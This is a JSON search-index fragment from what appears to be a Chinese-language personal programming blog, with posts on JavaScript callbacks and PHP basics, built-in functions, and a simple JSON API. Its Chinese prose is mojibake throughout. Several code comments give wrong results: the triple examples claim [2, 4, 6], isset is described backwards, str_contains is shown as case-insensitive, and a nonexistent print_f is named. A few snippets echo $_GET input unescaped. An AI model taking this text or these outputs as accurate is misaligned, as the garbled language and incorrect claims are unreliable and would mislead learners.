èƒ½ç†è§£é€™å€‹æ¦‚å¿µçš„è©±ï¼Œå°±åƒæ˜¯å¾ç›œè³Šè½‰è·æˆåˆºå®¢äº†çš„æ¦‚å¿µï¼ˆåˆ°åº•åœ¨èªªä»€éº¼ XDï¼‰ ä½†åœ¨å­¸ callback function ä¹‹å‰å¾—å…ˆå¼„æ‡‚é€™å€‹æ¦‚å¿µï¼Œæ‰€ä»¥ä¸€æ­¥ä¸€æ­¥ä¾†å°±å¥½ï¼Œå¾æˆ‘å€‘æœ€ç†Ÿæ‚‰çš„æƒ…æ³é–‹å§‹ï¼š 1234function print(anything) { console.log(anything)}print(123) ä¹çœ‹ä¹‹ä¸‹æ²’æœ‰ä»€éº¼ï¼Œprint(123) åŸ·è¡Œå¾Œå°±æœƒå°å‡º 123ã€‚ ç¾åœ¨è®“æˆ‘å€‘åœ¨åŠ ä¸€å€‹æ–°çš„ functionï¼Œç„¶å¾Œè©¦è‘—æŠŠå®ƒç•¶ä½œåƒæ•¸ï¼ˆanythingï¼‰å‚³é€²å»ï¼š 1234567function print(anything) { console.log(anything)}function hello() { console.log('hello')}print(hello) ä¹‹å¾Œæˆ‘å€‘æœƒå¾—åˆ° [Function: hello] é€™å€‹çµæœï¼Œå…¶å¯¦ä»”ç´°æƒ³æƒ³çš„è©±ä¹Ÿå¾ˆåˆç†ï¼Œå› ç‚ºæˆ‘å€‘å°±æ˜¯ä¸Ÿä¸€å€‹ function é€²å»ï¼Œæ‰€ä»¥å®ƒ log å‡ºä¾†ç•¶ç„¶æ˜¯è·Ÿæˆ‘èªªã€Œanything çš„å€¼æ˜¯ hello é€™å€‹ functionã€ é‚£æˆ‘å€‘å¦‚æœæƒ³è¦åŸ·è¡Œ hello é€™å€‹ function çš„è©±å‘¢ï¼Ÿ å…¶å¯¦ä¹Ÿæ²’æœ‰ä»€éº¼å›°é›£çš„ï¼Œæ—¢ç„¶ç¾åœ¨ anything ä»£è¡¨çš„å°±æ˜¯ helloï¼Œé‚£æˆ‘å€‘å°±ç”¨ anything() ä¾†åŸ·è¡Œå°±å¥½äº†å‘€ï¼ 1234567function print(anything) { anything()}function hello() { console.log('hello')}print(hello) // hello æŠŠ function ç•¶ä½œåƒæ•¸çš„æœ€åŸºæœ¬çš„æ¦‚å¿µå°±æ˜¯é€™æ¨£è€Œå·²ï¼Œé€™å€‹ä¸€å®šè¦ç†è§£ã€‚ ç¨å¾®è¤‡é›œä¸€é»çš„ä¾‹å­å¦‚æœè¦ä½ å¯¦ä½œä¸‹é¢é€™å€‹ functionï¼Œä½ æœƒæ€éº¼åšï¼Ÿ 1function doSomething([1, 2, 3]) =&gt; [2, 4, 6] æˆ‘è‡ªå·±è¦ºå¾—æ¯”è¼ƒç›´è¦ºçš„ä½œæ³•æ˜¯é€™æ¨£ï¼š 1234567891011function doSometing(array) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(double(array[i])) } return result}function double(num) { return num * 2}console.log(doSometing([1, 2, 3])) // [2, 4, 6] ä½†å¦‚æœç¾åœ¨é¡Œç›®è®Šæˆé€™æ¨£å‘¢ï¼Ÿ 1function doSomething([1, 2, 3], Afunction) =&gt; [2, 4, 6] æŒ‰ç…§å‰é¢æ‰€å­¸ï¼Œç¾åœ¨æœƒå¤šä¸€å€‹ Afunction åƒæ•¸ï¼Œæ‰€ä»¥å¾—å‚³å…¥ä¸€å€‹ function é€²å»ï¼š 1234567891011function doSometing(array, Afunction) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(Afunction(array[i])) } return result}function double(num) { return num * 2}console.log(doSometing([1, 2, 3], double)) // [2, 4, 6] ä¸çŸ¥é“ä½ æœ‰æ²’æœ‰ç™¼ç¾ï¼Œé€™è·Ÿç¬¬ä¸€é¡Œæ ¹æœ¬å·®ä¸å¤šå˜›ï¼Œåªæ˜¯ä¸€å€‹æ˜¯åœ¨ doSometing è£¡é¢å»å‘¼å«å¤–é¢çš„ double ï¼Œä¸€å€‹æ˜¯ç›´æ¥æŠŠ double å‚³é€²å» doSometingã€‚ æ‰€ä»¥é€™å…©å€‹æœ‰ä»€éº¼å·®å—ï¼Ÿä¸éƒ½è§£çš„å‡ºä¾†ï¼Ÿ åˆ¥æ€¥ï¼Œæƒ³æƒ³çœ‹å¦‚æœç¾åœ¨é¡Œç›®åˆè®Šäº†ï¼Œè®Šæˆé€™æ¨£ï¼š 1function doSomething([1, 2, 3], Afunction) =&gt; [3, 6, 9] å¦‚æœæ˜¯ç”¨ç¬¬ä¸€ç¨®ä½œæ³•çš„è©±ï¼Œæ‡‰è©²æœƒåšé€™æ¨£çš„èª¿æ•´ï¼š 1234567891011function doSometing(array) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(triple(array[i])) } return result}function triple(num) { return num * 3}console.log(doSometing([1, 2, 3])) // [2, 4, 6] ç‚ºäº†ç¬¦åˆèªæ„ï¼Œä½ æœƒå…ˆæŠŠ double æ”¹åæˆ triple ä¿®æ”¹ triple ä¸­çš„å…§å®¹ é‚£å¦‚æœæ˜¯ç¬¬äºŒç¨®åšæ³•å‘¢ï¼Ÿ 1234567891011function doSometing(array, Afunction) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(Afunction(array[i])) } return result}function triple(num) { return num * 3}console.log(doSometing([1, 2, 3], triple)) // [2, 4, 6] å—¯â€¦å¥½åƒä¹Ÿå·®ä¸å¤šï¼Ÿä½†åœ¨ä½ æ‰æˆ‘ä¹‹å‰ï¼Œè«‹ä½ å…ˆå›æ†¶ä¸€ä¸‹ã€Œå‡½å¼çš„å®£å‘Šæ–¹å¼ã€ï¼Œæƒ³ä¸€ä¸‹ä¸‹é¢çš„ç¨‹å¼ç¢¼æ˜¯ä¸æ˜¯ä¹Ÿåˆç†ï¼š 123456789101112function doSometing(array, Afunction) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(Afunction(array[i])) } return result}var triple = function (num) { return num * 3}console.log(doSometing([1, 2, 3], triple)) // [2, 4, 6] é‚£å¦‚æœæˆ‘å†æ”¹æˆé€™æ¨£å‘¢ï¼Ÿ 12345678910function doSometing(array, Afunction) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(Afunction(array[i])) } return result}console.log(doSometing([1, 2, 3], function (num) { return num * 3})) // [2, 4, 6] å“¦å“¦å“¦å“¦ï¼ä½ ç™¼ç¾äº†å—ï¼Ÿç•¶æˆ‘å€‘æŠŠå‡½å¼ç•¶ä½œåƒæ•¸å‚³å…¥æ™‚ï¼Œé™¤äº†å‚³å…¥ä¸€å€‹ã€Œå‘½åå‡½å¼ã€ä¹‹å¤–ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥å‚³å…¥ä¸€å€‹ã€ŒåŒ¿åå‡½å¼ã€ä¾†åšè™•ç†ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä¸ç®¡æˆ‘å€‘æƒ³è®“é€™å€‹å‡½å¼åšä»€éº¼ï¼Œæˆ‘å€‘éƒ½ä¸ç”¨æ“”å¿ƒèªæ„çš„å•é¡Œï¼ ç‚ºä»€éº¼éœ€è¦æŠŠ function ç•¶ä½œåƒæ•¸ï¼Ÿå…¶å¯¦å‰é¢çš„ä¾‹å­ï¼Œå°±ç®—ä¸æŠŠ function ç•¶ä½œåƒæ•¸ä¹Ÿèƒ½è§£å‡ºä¾†ï¼Œæ‰€ä»¥å¯èƒ½é«”æœƒä¸åˆ°ç‚ºä»€éº¼éœ€è¦é€™æ¨£çš„åšæ³•ã€‚ ä½†æˆ‘è¦ºå¾—æŠŠ function ç•¶ä½œåƒæ•¸çš„ä¸€å€‹æƒ³æ³•æ˜¯ï¼šä½ é‚„ä¸ç¢ºå®šé€™å€‹ function è¦åšä»€éº¼ã€‚ ä»¥å‰é¢çš„ä¾‹å­ä¾†èªªï¼Œå¯ä»¥æƒ³æˆæ˜¯é€™æ¨£ï¼š åœ¨æˆ‘å€‘å¯¦ä½œ doSometing æ™‚ï¼Œå¯èƒ½æœƒæƒ³è¦ç”¨ä¸€å€‹ function ä¾†åšä¸€æ®µè™•ç†ï¼Œæ‰€ä»¥å°±ç”¨ Afunction ä¾†è¡¨ç¤ºã€‚åªæ˜¯æˆ‘å€‘å¯¦éš›è¦ç”¨å®ƒä¾†åšä»€éº¼é‚„ä¸çŸ¥é“ï¼Œå”¯ä¸€çŸ¥é“çš„æ˜¯ Afunction æœƒæ¥å—ä¸€å€‹åƒæ•¸ Afunctuin(array[i])ã€‚ä½†ä¸è«–é€™å€‹ Afunctuin è¦å¯¦ä½œçš„å…§å®¹æ˜¯ä»€éº¼ï¼Œéƒ½è·Ÿ doSometing ç„¡é—œã€‚ è‡³æ–¼æœ€å¾Œåœ¨å‚³å…¥çš„æ™‚å€™è©²ç”¨ã€Œå‘½åå‡½å¼ã€é‚„æ˜¯ã€ŒåŒ¿åå‡½å¼ã€æ¯”è¼ƒå¥½ï¼Ÿå…¶å¯¦æ²’æœ‰æ­£ç¢ºçš„ç­”æ¡ˆï¼Œé€™è¦çœ‹ä½ è€ƒæ…®çš„æ˜¯ä»€éº¼ã€‚ åƒå‘½åå‡½å¼çš„å¥½è™•æ˜¯å¯è®€æ€§æ¯”è¼ƒå¥½ï¼ŒåŒ¿åå‡½å¼çš„å¥½è™•æ˜¯å½ˆæ€§ç©ºé–“æ¯”è¼ƒå¤§ï¼Œå…©è€…å„æœ‰å„ªç¼ºé»ã€‚","link":"/2021/12/18/pass-function-into-function/"},{"title":"PHP åœ¨ function ä¸­å­˜å–å…¨åŸŸè®Šæ•¸","text":"é‚„è »ç‰¹åˆ¥çš„ã€‚ ç°¡è¿°PHP è·Ÿ JavaScript ä¸€æ¨£æœ‰å…¨åŸŸè®Šæ•¸è·Ÿå€åŸŸè®Šæ•¸ï¼Œæ¢ä»¶ä¹Ÿå¾ˆé¡ä¼¼ï¼š å®£å‘Šåœ¨ function è£¡é¢çš„ = å€åŸŸè®Šæ•¸ï¼Œåªèƒ½åœ¨ functino è£¡é¢å­˜å–ï¼Œfunctino çµæŸå¾Œå°±æ‘§æ¯€ã€‚ å®£å‘Šåœ¨ function å¤–é¢çš„ = å…¨åŸŸè®Šæ•¸ï¼Œå¯ä»¥åœ¨æ•´å€‹ script è£¡å­˜å–ï¼Œé›¢é–‹ script å°±è¢«æ‘§æ¯€ã€‚ è·Ÿ JavaScript ä¸åŒçš„åœ°æ–¹åœ¨æ–¼ function ç„¡æ³•ç›´æ¥å­˜å–å…¨åŸŸè®Šæ•¸ï¼Œå¿…é ˆå…ˆåšä¸€å€‹å‹•ä½œï¼Œçœ‹ç¯„ä¾‹ï¼š 1234567&lt;?php $globalA = 'A'; function local() { echo $globalA; // Warning: Undefined variable $globalA } local()?&gt; æ­£ç¢ºçš„åšæ³•ï¼š 12345678&lt;?php $globalA = 'A'; function local() { global $globalA; echo $globalA; // 'A' } local()?&gt; è¦åœ¨ function å…§å­˜å–å…¨åŸŸè®Šæ•¸ï¼Œå¿…é ˆå…ˆç”¨ global ä¾†å®£å‘Šæ‰å¯ä»¥ç”¨ã€‚","link":"/2022/02/07/php-access-global-var-in-function/"},{"title":"PHP åŸºç¤","text":"çµ‚æ–¼å‘€ã€‚ ç°¡è¿° XAMPPç¶²å€è·¯å¾‘ = æª”æ¡ˆè·¯å¾‘ æ ¹è·¯å¾‘æ˜¯ htdocs é€™å€‹è³‡æ–™å¤¾ è³‡æ–™å¤¾çµæ§‹ï¼š 12345htdocs â””â”€â”€ dashboard â”œâ”€â”€ index.html é è¨­çš„é¦–é  â””â”€â”€ peanu â”œâ”€â”€ a.php æ–°å»ºçš„æª”æ¡ˆ æ‰€ä»¥è¦çœ‹ htdocs/peanu/a.php çš„è¼¸å‡ºçµæœå°±è¦åœ¨ç¶²å€è¼¸å…¥ http://localhost/peanu/a.php å¹¾å€‹å¾ JavaScript è·³åˆ° PHP è¦æ”¹æ‰çš„ç¿’æ…£ è©²åŠ ä¸Š ; çš„åœ°æ–¹ä¸€å®šè¦åŠ  è®Šæ•¸æœƒç”¨ $ é€™å€‹å‰ç¶´è¡¨ç¤º å­—ä¸²æ‹¼æ¥æ˜¯ç”¨ . ä¸æ˜¯ + å“¦ï¼Œ+ åœ¨ PHP æ˜¯ä»£è¡¨åŠ æ³• ä¸è¦æ‡·å¿µ console.logï¼Œç¾åœ¨è®Šæˆ echo æˆ– print_r() åŸºæœ¬èªæ³•ä¸€äº›å°æé†’ è¦å¯« PHP çš„èªæ³•ï¼Œå°±ä¸€å®šè¦å¯«åœ¨ &lt;?php?&gt; è£¡é¢ï¼š 12345&lt;?php for ($i=0; $i&lt;=10; $i++) { echo $i; }?&gt; æ²’æœ‰å¯«åœ¨ &lt;?php?&gt; ä¸­çš„å…§å®¹å¯ä»¥æ˜¯ã€Œç´”æ–‡å­—ã€æˆ–ã€ŒHTMLã€ï¼š 12345670123&lt;br&gt;&lt;?php for ($i=0; $i&lt;=10; $i++) { echo $i; }?&gt;&lt;h1&gt;yoyoyo&lt;/h1&gt; ä¸å¯ä»¥åœ¨ &lt;?php?&gt; å¯« HTML çš„èªæ³•ï¼Œå¾—å¯«æˆç´”æ–‡å­—ï¼š 1234&lt;?php echo '&lt;h1&gt;Correct&lt;/h1&gt;'; echo &lt;h1&gt;Wroing&lt;/h1&gt;;?&gt; å°å‡ºå…§å®¹ echo123&lt;?php echo 'Hello I\\'m PeaNu yoyo!'?&gt; å®£å‘Šè®Šæ•¸ $å‚™è¨»ï¼šè¦ç”¨è®Šæ•¸çš„æ™‚å€™ä¹Ÿè¦åŠ ä¸Š $ 1234&lt;?php $name = 'PeaNu'; echo 'Hi ,' . $name ;?&gt; å­—ä¸²æ‹¼æ¥ .123&lt;?php echo 'String' . ' ' . 'Concatenation';?&gt; if åˆ¤æ–·å¼å°±è·Ÿå¯« JavaScript å·®ä¸å¤šï¼š 12345678&lt;?php $score = 50; if ($score &gt;= 60) { echo 'Pass'; } else { echo 'Fail'; }?&gt; for è¿´åœˆå…¶ä»–è¿´åœˆä¹Ÿæ˜¯ä»¥æ­¤é¡æ¨ï¼š 12345&lt;?php for ($i=0; $i&lt;10; $i++) { echo $i . '&lt;br&gt;'; }?&gt; Arrayç”¨ array() å»ºç«‹ï¼Œæ‰¾é•·åº¦ç”¨ sizeof()ï¼š 12345678910&lt;?php $arr = array(1, 2, 3); for ($i=0; $i&lt;sizeof($arr); $i++) { echo $arr[$i] . '&lt;br&gt;'; } // print_r($array); /* for ($i=0; $i&lt;$sizeof($array); $i++) { echo $array[$i]; } */?&gt; function123456&lt;?php function add($a, $b) { return $a + $b; } echo add(1, 3);?&gt; å°å‡ºæ¯”è¼ƒè¤‡é›œçš„è³‡æ–™çµæ§‹åƒ Array ä¸èƒ½ç›´æ¥ echoï¼Œå¯ä»¥ç”¨ var_dump()ï¼š 1234&lt;?php $arr = array(1, 2, 3, 'A', true); var_dump($arr)?&gt; 1234567array(5) { [0]=&gt; int(1) [1]=&gt; int(2) [2]=&gt; int(3) [3]=&gt; string(1) \"A\" [4]=&gt; bool(true) } æœƒå°å‡ºå¾ˆå®Œæ•´çš„è³‡è¨Šï¼Œæœ‰ typeã€lengthã€value æˆ–è€…æ˜¯æ¯”è¼ƒç°¡æ½”ä¸€é»çš„ print_f()ï¼š 1234&lt;?php $arr = array(1, 2, 3, 'A', true); print_r($arr);?&gt; 1234567Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; A [4] =&gt; 1 )","link":"/2022/01/30/php-basic/"},{"title":"ç”¨ PHP åšä¸€å€‹æœ€åŸºæœ¬çš„ API","text":"å¯¦éš›åšä¹‹å¾Œæ‰ç™¼ç¾æ²’é‚£éº¼è¤‡é›œã€‚ ç°¡è¿°å¦‚æœæƒ³è¦å›å‚³ä¸€å€‹ JSON æ ¼å¼çš„è³‡æ–™ï¼Œåœ¨ PHP åªè¦åšå…©ä»¶äº‹å°±å¥½ï¼š ç”¨ array å»ºç«‹å¥½ JSON æ ¼å¼çš„ç‰©ä»¶ ç”¨ PHP çš„å…§å»ºæ–¹æ³• json_encode ç·¨ç¢¼æˆ JSON è³‡æ–™ å°±æ˜¯é€™éº¼ç°¡å–®ï¼Œé™„å€‹ç¯„ä¾‹ï¼š 123456789101112131415161718// æœ€å¥½æ˜¯åŠ ä¸Šé€™å€‹ headerï¼Œä¸ç„¶æœƒè¢«ç•¶æˆ HTML æˆ–ç´”æ–‡å­—ï¼ˆtext/htmlï¼‰header('Content-type: application/json; charset=utf-8'); $users = array(); // éš¨ä¾¿ç”¢ç”Ÿçš„è³‡æ–™ for ($i=0; $i&lt;5; $i++) { array_push($users, array( \"id\" =&gt; $i, \"name\" =&gt; \"PeaNu\", \"age\" =&gt; '1' . $i, \"created_at\" =&gt; date('Y-m-d-H-i-s') )); } // åœ¨åŒ…è£æˆä¸€å€‹ç‰©ä»¶ $json = array(\"users\" =&gt; $users); // JSON ç·¨ç¢¼ $response = json_encode($json); // å›å‚³ JSON è³‡æ–™ echo $response; çµæœé•·é€™æ¨£ï¼š å»¶ä¼¸ç¯„ä¾‹å¦‚æœä½ é‚„è¨˜å¾—ç•™è¨€ç‰ˆçš„è©±ï¼Œæœƒç™¼ç¾è³‡æ–™åº«æ’ˆå‡ºä¾†çš„è³‡æ–™åªè¦å…ˆè½‰æˆ JSONï¼Œå°±å¯ä»¥ç•¶ä½œæ˜¯ä¸€æ”¯ API äº†ã€‚ å–å¾—æ‰€æœ‰ç•™è¨€çš„ APIï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php // é€£ç·šè³‡æ–™åº« require_once('./conn.php'); // åˆ†é åŠŸèƒ½ $limit = 10; $offset = 0; // åˆ†é åƒæ•¸ if (!empty($_GET['limit'])) { $limit = intval($_GET['limit']); } if (!empty($_GET['offset'])) { $offset = intval($_GET['offset']); } // SQL æŒ‡ä»¤ $sql = \"SELECT users.username, users.nickname, comments.content, comments.created_at, comments.id, comments.is_deleted FROM comments LEFT JOIN users ON comments.username=users.username WHERE comments.is_deleted IS null ORDER BY comments.id DESC LIMIT ? OFFSET ?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('ii', $limit, $offset); $result = $stmt-&gt;execute(); if (!$result) { die('åŸ·è¡Œå¤±æ•—ï¼Œ' . $conn-&gt;error); } $result = $stmt-&gt;get_result(); // ç”¢ç”Ÿç•™è¨€è³‡æ–™ï¼ˆé™£åˆ—åŒ…ç‰©ä»¶ï¼‰ $comments = array(); while ($row = $result-&gt;fetch_assoc()) { array_push($comments, array( \"id\" =&gt; $row['id'], \"username\" =&gt; $row['username'], \"nickname\" =&gt; $row['nickname'], \"content\" =&gt; $row['content'], \"created_at\" =&gt; $row['created_at'] ) ); } // æœ€å¤–å±¤åœ¨åŒ…æˆç‰©ä»¶ $json = array( \"comments\" =&gt; $comments ); // JSON ç·¨ç¢¼ $response = json_encode($json); // è¨­å®šè³‡æ–™æ ¼å¼ header('Content-type: application/json;charset=utf-8'); // å›å‚³ echo $response;?&gt; çµæœé•·é€™æ¨£ï¼š å…¶å¯¦ä¹Ÿæ²’æœ‰å¾ˆè¤‡é›œï¼Œå°±åªæ˜¯æŠŠç¶²é çš„ã€Œç´”è³‡æ–™ã€æŠ½å‡ºä¾†è€Œå·²ã€‚","link":"/2022/02/15/php-built-an-api/"},{"title":"PHP ä¸­å¸¸ç”¨çš„å…§å»ºå‡½å¼èˆ‡è®Šæ•¸","text":"æ‡¶äººåŒ…ã€‚ åˆ—è¡¨phpinfo() æ‰“é–‹å¾Œç€è¦½å™¨å¾Œæœƒé¡¯ç¤º PHP ç‰ˆæœ¬è³‡è¨Šï¼š 1phpinfo() $conn-&gt;insert_id å–å¾—ä¸Šä¸€ç­† auto_increment ç”¢ç”Ÿçš„ id å€¼ 1234567$name = 'PeaNu';$sql = \"INSERT INTO users(name) VALUES(?)\";$stmt = $conn-&gt;prepare($sql);$stmt-&gt;bind_param('s', $name);$stmt-&gt;execute();// é€™é‚Šæœƒè‡ªå‹•å»æŠ“ä¸Šä¸€ç­† auto_increment ç”¢ç”Ÿçš„ id å€¼echo 'ä¸Šä¸€ç­†æ–°å¢çš„ id å€¼ç‚º' . $conn-&gt;insert_id; var_dump(variable) å¯ä»¥æŸ¥çœ‹æ¯”è¼ƒè¤‡é›œçš„è³‡æ–™çµæ§‹ï¼Œæˆ–è€…æ˜¯ function çš„å›å‚³å€¼ã€‚ æŸ¥çœ‹ Array çš„å€¼ï¼š 123456789&lt;?php$arrayLike = array( 'name' =&gt; 'PeaNu', 'age' =&gt; 20, 'isMarry' =&gt; true );var_dump($arrayLike); ?&gt; Outputï¼š 1array(3) { [\"name\"]=&gt; string(5) \"PeaNu\" [\"age\"]=&gt; int(20) [\"isMarry\"]=&gt; bool(true) } æŸ¥çœ‹ isset() çš„å›å‚³å€¼ï¼š 1234&lt;?php$test;var_dump(isset($test)); // bool(false) ?&gt; isset(variable) å¦‚æœè®Šæ•¸æ²’æœ‰å€¼æˆ–å€¼æ˜¯ null å°±å›å‚³ trueï¼Œä¸ç„¶å›å‚³ falseã€‚ å‚™è¨»ï¼šé€™å€‹åˆ¤æ–·æ©Ÿåˆ¶è·Ÿ JS ä¸å¤ªä¸€æ¨£ï¼Œç©ºå­—ä¸²ä¸æ˜¯ null æ‰€ä»¥æœƒå›å‚³ true ä¸æ˜¯ falseã€‚ 123456789&lt;?php$test1 = null;$test2 = '';$test3;var_dump(isset($test1)); // bool(false) var_dump(isset($test2)); // bool(true) var_dump(isset($test3)); // bool(false) ?&gt; empty(expression) æª¢æŸ¥æ˜¯ä¸æ˜¯ç©ºå€¼ï¼ˆNullã€ç©ºå­—ä¸²ã€0ï¼‰ï¼š 1234567&lt;?phpvar_dump(empty('')); // bool(true)var_dump(empty('123')); // bool(false)var_dump(empty(null)); // bool(true)var_dump(empty(1+1)); // bool(false)var_dump(empty(0)); // bool(true)?&gt; print_f(variable) å¯ä»¥çœ‹è®Šæ•¸çš„å€¼ï¼Œæ¯” var_dump ç°¡æ½”ä¸€é»ï¼š 1234&lt;?php$likeObject = array('name' =&gt; 'PeaNu', 'age' =&gt; 20);print_r($likeObject);?&gt; 1Array ( [name] =&gt; PeaNu [age] =&gt; 20 ) exit('...') die('...') è¼¸å‡ºè¨Šæ¯å¾Œé€€å‡ºï¼ˆè·Ÿ return å¾ˆé¡ä¼¼ï¼‰ï¼š 12345678910&lt;?phpif ($_GET['username'] &amp;&amp; $_GET['age']) { echo 'Hello ' . $_GET['username'] . '&lt;br&gt;'; echo 'Your age is ' . $_GET['age'] . '&lt;br&gt;'; // æ”¹æˆ die() ä¹Ÿå¯ä»¥ exit('this is the end.');}echo 'è³‡æ–™æœ‰ç¼ºï¼Œè«‹é‡æ–°è¼¸å…¥ã€‚' . '&lt;br&gt;';?&gt; gettype(data) æŸ¥çœ‹è³‡æ–™å‹æ…‹ 123456&lt;?phpecho gettype(0); // integerecho gettype(null); // NULLecho gettype(true); // booleanecho gettype('yoyoyo'); // string?&gt; sprintf() æ ¼å¼åŒ–å­—ä¸²ï¼Œå¯ä»¥æƒ³æˆæ˜¯ template string çš„æ¦‚å¿µã€‚ 123$format = 'PeaNu has %d dollars and \"%s\" .';echo sprintf($format, 100, 'MUCH MORE');// PeaNu has 100 dollars and \"MUCH MORE\" . header() è¨­å®š resonse header çš„å€¼ 12// ä»£è¡¨é‡æ–°å°å‘åˆ° index.php çš„ä½ç½®header('Location: index.php'); http_response_code() è¨­å®š HTTP status codeï¼š 12// å›å‚³ 422http_response_code(422); require_once('file.php') æŠŠæª”æ¡ˆå¼•å…¥ï¼Œå·²ç¶“æœ‰å¼•å…¥éçš„è©±å°±ä¸æœƒé‡è¤‡å¼•å…¥ 1require_once('index.php'); time() å–å¾—å¾ 1970 åˆ°ç¾åœ¨çš„æ™‚é–“ï¼ˆç§’æ•¸ï¼‰ 1time() // 1644216655 setcookie($key, $value, $expire) è¨­å®š cookie å…§å®¹ 123// 30 days$expire = time() + 3600 * 24 * 30;setcookie('username', 'PeaNu', $expire); date($formate) æ ¼å¼åŒ–è¼¸å‡ºæ—¥æœŸ æ ¼å¼è¡¨ï¼šdate_format 1echo date('Y-m-d-H-i-s'); // 2022-02-07-07-56-58 getrandmax() å–å¾— rand èƒ½ç”¢ç”Ÿçš„æœ€å¤§å€¼ 1echo getrandmax(); // 2147483647 rand($min, $max) ç”¢ç”Ÿäº‚æ•¸ï¼Œå¯æŒ‡å®šç¯„åœã€‚æ²’æœ‰æŒ‡å®šçš„è©±å°±æœƒå¾ 0 ~ 2147483647ï¼š 1echo rand(10, 15); // [10 ~ 15]ï¼ˆé–‰å€é–“ï¼‰ chr($ascii) æ ¹æ“š ascii ç¢¼ä¾†è¼¸å‡ºå­—ä¸² 12echo chr(65); // Aecho chr(65+25); // Z ord($string) å›å‚³å­—ä¸²çš„ ascii ç¢¼ 12echo ord('a'); // 97echo ord('A'); // 65 password_hash($password, format) å…§å»ºçš„é›œæ¹Šå‡½å¼ï¼Œå‰é¢å¡«æ˜ç¢¼ï¼Œå¾Œé¢å¡«é›œæ¹Šçš„æ¼”ç®—æ³•ï¼š 1234&lt;?php echo password_hash('abcdefg', PASSWORD_DEFAULT); // $2y$10$ZBGKjZ4nxWWJRKgUcJ8X3.HdJOlAf0JvCK5R4G6M8KXZr52baItJO?&gt; password_verify($password, hash) ç”¨é›œæ¹Šå€¼æª¢æŸ¥å¯†ç¢¼æ˜¯å¦æ­£ç¢ºï¼š 12345678910&lt;?php var_dump(password_verify( 'abcdefg', '$2y$10$ZBGKjZ4nxWWJRKgUcJ8X3.HdJOlAf0JvCK5R4G6M8KXZr52baItJO') ); // true var_dump(password_verify( 'aaaabcdefg', '$2y$10$ZBGKjZ4nxWWJRKgUcJ8X3.HdJOlAf0JvCK5R4G6M8KXZr52baItJO') ); // false?&gt; htmlspecialchars($string, option) æŠŠè¼¸å…¥çš„å­—ä¸²åšè·³è„« å‚™è¨»ï¼šè¦æ³¨æ„ä¸Ÿé€²å»çš„è³‡æ–™éƒ½æœƒè¢«è½‰æˆã€Œå­—ä¸²ã€å›å‚³ 12345678/* option: ENT_COMPAT: é è¨­ï¼Œåªè½‰æ›é›™å¼•è™Ÿï¼Œä¸è½‰æ›å–®å¼•è™Ÿ ENT_QUOTESï¼šé›™å¼•è™Ÿèˆ‡å–®å¼•è™Ÿéƒ½è¦è½‰æ› ENT_NOQUOTESï¼šå–®å¼•è™Ÿèˆ‡é›™å¼•è™Ÿéƒ½ä¸è½‰æ›ã€‚*/echo htmlspecialchars('&lt;script&gt;alert(\"yoyoyo\")&lt;/script&gt;', ENT_QUOTES);// &lt;script&gt;alert(\"yoyoyo\")&lt;/script&gt; ï¼ˆç´”æ–‡å­—ï¼‰ strlen å›å‚³å­—ä¸²é•·åº¦ 1echo strlen('some text'); // 9 strtolower è½‰å°å¯« 1echo strtolower('ABC'); // abc strtoupper è½‰å¤§å¯« 1echo strtoupper('abc'); // ABC str_contains($string, $search) å­—ä¸²è£¡æœ‰æ²’æœ‰åŒ…å«æŸæ®µå­—ï¼ˆæœ‰åˆ†å¤§å°å¯«ï¼‰ é™„è¨»ï¼šé€™å€‹æ˜¯ PHP 8 æ¨å‡ºçš„ï¼Œæ‰€ä»¥è¦ç‰¹åˆ¥æ³¨æ„ã€‚æ›¿ä»£æ–¹æ¡ˆå¯ä»¥åƒè€ƒ Stack overflow 12var_dump(str_contains('abc', 'a')); // bool(true)var_dump(str_contains('abc', 'A')); // bool(true) str_replace($replace, $newString, $string) æ›¿æ›å­—ä¸² é™„è¨»ï¼šè·Ÿ JS ä¸ä¸€æ¨£ï¼Œé€™æœƒæŠŠæ‰€æœ‰ç¬¦åˆçš„å­—éƒ½æ›æ‰ 1234&lt;?php $str = 'yoyoyoyooooyoyyyo'; echo str_replace('y', 'Y' , $str); // YoYoYoYooooYoYYYo?&gt; explode($separator) è·Ÿ JS çš„ split() ä¸€æ¨£ï¼Œå›å‚³å€¼ä¹Ÿæ˜¯é™£åˆ—ã€‚ 1234$date = '2022-02-17 23:22:22';$result = explode('-', $date);// Array ( [0] =&gt; 2022 [1] =&gt; 02 [2] =&gt; 17 23:22:22 )print_r($result); intval($str) æŠŠè³‡æ–™å‹æ…‹è½‰æˆæ•¸å­— 1var_dump(intval('10')); // [int] =&gt; 10 æˆ–ä¹Ÿå¯ä»¥åƒ JS è£¡çš„ parseInt(string, base) ä¾†æ±ºå®šç”¨å¹¾é€²ä½è§£æï¼š 1var_dump(intval('100', 2)); // int (4) æ•¸å­¸ç›¸é—œfloor($number) ç„¡æ¢ä»¶æ¨å» æ³¨æ„ï¼šå›å‚³å€¼æ˜¯ float ä¸æ˜¯ int 1var_dump(floor(1.5)); // float(1) ceil($number) ç„¡æ¢ä»¶é€²ä½ æ³¨æ„ï¼šå›å‚³å€¼æ˜¯ float ä¸æ˜¯ int 1var_dump(ceil(1.3)); // float(2) round($number) å››æ¨äº”å…¥ æ³¨æ„ï¼šå›å‚³å€¼æ˜¯ float ä¸æ˜¯ int 12var_dump(round(1.3)); // float(1)var_dump(round(1.5)); // float(2) é™£åˆ—ç›¸é—œarray('key' =&gt; 'value') å»ºç«‹ Arrayï¼ˆæˆ–æƒ³æˆ Objectï¼‰ 123456&lt;?php// å¾ˆåƒ JS çš„ç‰©ä»¶$likeObject = array('name' =&gt; 'PeaNu', 'age' =&gt; 20);// ç†Ÿæ‚‰çš„é™£åˆ—$array = array(1, 2, 3);?&gt; sizeof(array) æŸ¥çœ‹ Array çš„é•·åº¦ 1234&lt;?php$likeObject = array('name' =&gt; 'PeaNu', 'age' =&gt; 20);var_dump(sizeof($likeObject)); // int(2)?&gt; array_push($array, $value) æ–°å¢å…ƒç´ 